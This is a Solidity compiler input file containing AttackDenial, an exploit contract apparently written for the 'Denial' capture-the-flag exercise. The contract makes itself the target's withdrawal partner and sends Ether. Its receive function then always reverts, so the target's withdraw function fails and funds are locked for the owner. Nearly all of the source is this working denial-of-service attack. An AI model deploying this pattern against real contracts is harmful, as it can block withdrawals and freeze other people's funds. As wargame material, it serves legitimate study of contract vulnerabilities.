{
  "language": "Solidity",
  "sources": {
    "contracts/Denial/AttackDenial.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IDenial {\n    function setWithdrawPartner(address _partner) external;\n    function withdraw() external;\n}\n\ncontract AttackDenial {\n    IDenial public target;\n\n    constructor(IDenial _target) {\n        target = _target;\n    }\n\n    // Main function to execute the attack\n    function configure() external payable {\n        // Set this contract as the withdrawal partner on the target contract\n        target.setWithdrawPartner(address(this));\n\n        // Send Ether to the target contract (Denial)\n        (bool success, ) = payable(address(target)).call{value: msg.value}(\"\");\n        require(success, \"Error sending Ether during the pwn() operation!\");\n    }\n\n    function withdraw() external {\n        // Finally, withdraw tokens for both the owner and this contract\n        target.withdraw();\n    }\n    \n    // Function to receive Ether: we immediately revert to deny the operation\n    receive() external payable {\n        revert(\"System compromised!\");\n    }\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "abi",
          "evm.bytecode",
          "evm.deployedBytecode",
          "evm.methodIdentifiers",
          "metadata",
          "devdoc",
          "userdoc",
          "storageLayout",
          "evm.gasEstimates"
        ],
        "": [
          "ast"
        ]
      }
    },
    "metadata": {
      "useLiteralContent": true
    }
  }
}